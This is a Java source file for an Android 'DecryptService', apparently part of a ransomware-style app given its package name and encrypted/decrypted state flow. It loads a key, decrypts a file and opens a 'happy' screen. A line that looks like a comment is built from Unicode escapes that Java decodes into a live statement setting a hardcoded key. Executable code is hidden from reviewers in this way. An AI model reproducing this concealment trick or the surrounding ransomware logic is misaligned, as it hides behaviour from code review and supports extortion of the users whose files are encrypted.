package alepacheco.com.rw.services;

import alepacheco.com.rw.persistence.LocalStorage;

/**
 * Created by joao on 05/07/2017.
 */

public class DecryptService extends MyService {

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            /* \u002a\u002f\u004b\u0045\u0059\u0020\u003d\u0020\u0022\u0030\u0031\u0032\u0033\u0034\u0035\u0036\u0037\u0038\u0039\u0030\u0031\u0032\u0033\u0034\u0035\u0022\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0022\u0055\u0054\u0046\u0038\u0022\u0029\u003b\u002f\u002a */
            if(checkEncryptedState()) {
                this.KEY = LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_TEMP_KEY).getBytes();
                decryptFile();
                saveDecryptedState();
                openHappyActivity();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

}
